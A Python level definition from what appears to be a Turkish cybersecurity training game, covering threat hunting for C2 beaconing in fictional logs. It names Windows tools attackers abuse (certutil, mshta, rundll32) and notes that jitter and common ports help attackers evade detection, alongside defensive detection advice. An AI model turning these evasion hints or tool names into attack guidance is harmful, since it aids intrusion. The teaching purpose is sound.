çevir ki bir dahaki sefere av gerekmesin. Saldırgan açısından da ders var: jitter (rastgele sapma) eklemek ve sıradan
portlardan konuşmak desenleri gizler; bu yüzden avcı tek eşiğe değil, birkaç ölçüte bakar.
"""


SEVIYE = Seviye(
    kimlik="c07b10",
    cilt=7,
    bolum=10,
    baslik="Tehdit Avı: Alarm Beklemeden Aramak",
    brifing="""
Deniz Kara masasında kahvesini bırakıyor: "**<<musteri>>** (<<sektor>>) için bu kez acil çağrı yok, tam tersi: <<hikaye>>
<<kisi>> bize üç dosya verdi: ağ bağlantı günlüğü, süreç günlüğü ve kurumun bilinen-iyi IP listesi. Hepsi kurgusal."

"Buna **tehdit avı** diyoruz," diyor Deniz. "Alarmı beklemiyoruz; bir hipotez kuruyoruz: **<<hipotez>>**. Sonra
kayıtlarda o hipotezin bırakacağı izi arıyoruz." Mert ekliyor: "Çok bağlanan şüpheli değil, düzenli bağlanan şüpheli.
Gürültünün içinden desen çıkar."
""",
    adimlar=ADIMLAR,
    gorevler=GOREVLER,
    uret=uret,
    yaz=yaz,
    coz=coz,
    kapanis=_kapanis(),
    gercek_hayat="""
- **LOLBin / living-off-the-land:** Saldırganların Windows'un kendi araçlarını (`certutil`, `mshta`, `regsvr32`,
  `rundll32`, `powershell` gibi) kötüye kullanması iyi belgelenmiştir; bu araçların kötüye kullanım yolları kamuya açık
  **LOLBAS** projesinde derlenir ve MITRE ATT&CK'ta "System Binary Proxy Execution" gibi tekniklerle eşlenir. Microsoft,
  Mayıs 2023'te Volt Typhoon adlı grubun da ağırlıkla bu yaklaşımı kullandığını yayımladı. Tespit: Office'ten doğan
  sistem aracı, internetten dosya indiren `certutil` gibi anne-çocuk ve komut satırı sapmaları; önleme: uygulama
  kontrolü ve kullanılmayan araçların kısıtlanması.
- **APT beaconing:** SolarWinds olayında (Aralık 2020 açıklandı) SUNBURST arka kapısı, kurulumdan sonra bir süre beklemiş ve
  komuta sunucusuyla iletişimde zamanlamayı gizlemeye çalışmıştı; Cobalt Strike gibi saldırı çerçeveleri de "sleep" ve
  "jitter" ayarlarıyla yoklama aralığını rastgeleleştirir. Bu yüzden av, tek bir aralığa değil, ortalamaya ve sapmaya
  bakar. Tespit: tek makineden, bilinen-iyi dışı bir hedefe düzenli ve küçük bayt boyutlu bağlantılar; önleme: çıkış
  trafiğinde izinli hedef listesi ve DNS/proxy kaydı izleme.
- **Hipotez güdümlü av:** Av ekipleri hipotezlerini genellikle MITRE ATT&CK tekniklerinden türetir ("bu teknik bizde
  kullanılsa hangi iz kalırdı?"), bulunan deseni kalıcı algılama kuralına çevirir ve böylece avın çıktısı SIEM'e geri
  beslenir.
""",
    sure_hedef_dk=35,
)
